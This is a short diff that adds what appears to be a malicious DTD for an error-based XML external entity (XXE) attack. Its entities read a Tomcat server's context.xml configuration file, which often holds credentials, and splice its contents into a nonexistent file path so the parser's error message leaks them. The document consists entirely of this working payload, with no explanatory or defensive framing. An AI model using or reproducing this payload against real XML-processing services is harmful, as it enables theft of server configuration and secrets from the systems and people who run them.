@@ -1,0 +1,4 @@
+ <!ENTITY % file SYSTEM "file:///usr/local/tomcat/conf/context.xml">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///clx-NONEXISTENT-PATH/%file;'>">
+  %eval;
+  %exfil;
